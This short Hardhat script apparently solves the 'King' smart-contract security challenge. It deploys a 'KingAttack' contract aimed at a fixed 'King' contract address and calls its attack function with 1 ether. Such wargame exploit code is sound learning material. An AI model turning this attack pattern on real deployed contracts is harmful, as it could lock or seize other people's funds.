import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xb7c7142Cb2cBf105Eca46A00dDD0Fb3DD7698E8b"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("King", CONTRACT_ADDRESS, signer)
    const _provider = contract.provider;

    const KingAttackContract = await ethers.getContractFactory("KingAttack")
    const kingAttackContract = await KingAttackContract.deploy(contract.address)
    await kingAttackContract.deployed()

    //attack
    await kingAttackContract.attack({
        value: ethers.utils.parseEther("1"),
    }
    )

}




// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});